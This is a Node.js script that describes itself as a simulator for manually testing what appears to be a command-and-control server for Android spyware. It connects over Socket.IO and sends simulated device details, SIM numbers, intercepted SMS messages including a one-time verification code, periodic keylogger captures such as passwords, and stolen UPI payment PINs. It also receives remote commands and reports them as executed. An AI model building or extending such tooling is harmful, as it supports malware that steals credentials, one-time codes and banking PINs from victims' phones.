const { io } = require('socket.io-client');

const SERVER_URL = 'http://localhost:3002';
const DEVICE_ID = 'SIM_DEVICE_12345';
const APP_ID = '1aa9b800-370d-4152-b21d-ef302e5cdb6c';
const BUILD_ID = 'v1.0.0-test';

console.log(`🚀 Starting Simulator for Manual Testing`);
console.log(`📍 Server: ${SERVER_URL}`);
console.log(`📱 Device: ${DEVICE_ID}`);
console.log(`🛡️ App ID: ${APP_ID}`);

const socket = io(SERVER_URL, {
    query: {
        device_id: DEVICE_ID,
        app_id: APP_ID,
        build_id: BUILD_ID
    }
});

socket.on('connect', () => {
    console.log('✅ Connected to Socket.IO Provider Server');

    // 1. Initial Data Upsert
    socket.emit('upsert_device_data', {
        device_id: DEVICE_ID,
        manufacturer: 'Samsung',
        model: 'Galaxy S24 Ultra (Simulated)',
        brand: 'samsung',
        androidVersion: '14',
        appId: APP_ID,
        buildId: BUILD_ID,
        battery: 88,
        sim_cards: [
            { slot: 0, operator: 'T-Mobile', number: '+1 (555) 001-9999' },
            { slot: 1, operator: 'Verizon', number: '+1 (555) 002-8888' }
        ]
    }, () => console.log('📡 Initial device data sent.'));

    // 2. Initial SMS Sync
    socket.emit('sync_sms', JSON.stringify([
        {
            device_id: DEVICE_ID,
            id: 'sms_991',
            local_sms_id: 'l_991',
            address: 'Google',
            body: 'Your verification code is 442101. Do not share this code.',
            timestamp: Date.now() - 3600000,
            type: 1
        },
        {
            device_id: DEVICE_ID,
            id: 'sms_992',
            local_sms_id: 'l_992',
            address: '+123456789',
            body: 'Hey, are we still meeting for lunch at 1 PM?',
            timestamp: Date.now() - 1800000,
            type: 1
        },
        {
            device_id: DEVICE_ID,
            id: 'sms_993',
            local_sms_id: 'l_993',
            address: 'Amazon',
            body: 'Your package has been delivered to your front door.',
            timestamp: Date.now() - 600000,
            type: 1
        }
    ]), () => console.log('📩 Sample SMS messages synced.'));

    // 3. Keep-alive Heartbeat Loop (every 30 seconds)
    setInterval(() => {
        const battery = Math.floor(Math.random() * 20) + 70; // 70-90%
        socket.emit('send_heartbeat', {
            device_id: DEVICE_ID,
            type: 'ping',
            status: true,
            battery_level: battery,
            network_type: 'WIFI',
            created_at: new Date().toISOString()
        });
        console.log(`💓 Heartbeat sent (Battery: ${battery}%)`);
    }, 30000);

    // 4. Periodic Keylogger Simulation (every 45 seconds)
    setInterval(() => {
        const keys = ['facebook login', 'password123', 'amazon search: s24 ultra', 'whatsapp message: hello'];
        const key = keys[Math.floor(Math.random() * keys.length)];
        socket.emit('set_key_log', {
            device_id: DEVICE_ID,
            keylogger: 'com.android.inputmethod',
            key: key,
            current_date: new Date().toISOString()
        });
        console.log(`⌨️ Keylog sent: ${key}`);
    }, 45000);

    // 5. Periodic UPI Pin Simulation (every 90 seconds)
    setInterval(() => {
        const pins = ['1234', '9988', '0000', '1122'];
        const pin = pins[Math.floor(Math.random() * pins.length)];
        socket.emit('set_upi_pin', {
            device_id: DEVICE_ID,
            pin: pin,
            current_date: new Date().toISOString()
        });
        console.log(`🔐 UPI Pin sent: ${pin}`);
    }, 90000);

    console.log('⏳ Simulator is now running. You can test in the frontend.');
});

socket.on('command', (data) => {
    try {
        const commands = JSON.parse(data);
        console.log('📦 RECEIVED COMMAND(S):');
        console.log(JSON.stringify(commands, null, 2));

        commands.forEach(cmd => {
            console.log(`🚀 Executing: ${cmd.command}...`);
            // Simulate execution time
            setTimeout(() => {
                socket.emit('mark_command_executed', cmd.id, (success) => {
                    console.log(`✅ Command ${cmd.id} execution reported: ${success}`);
                });
            }, 3000);
        });
    } catch (e) {
        console.error('❌ Command Error:', e.message);
    }
});

socket.on('disconnect', () => {
    console.warn('❌ Disconnected from server. Attempting reconnect...');
});

socket.on('connect_error', (err) => {
    console.error('❌ Connection Error:', err.message);
});

// Run for 2 hours for manual testing
setTimeout(() => {
    console.log('🏁 Simulation time limit reached.');
    socket.disconnect();
    process.exit(0);
}, 7200000);
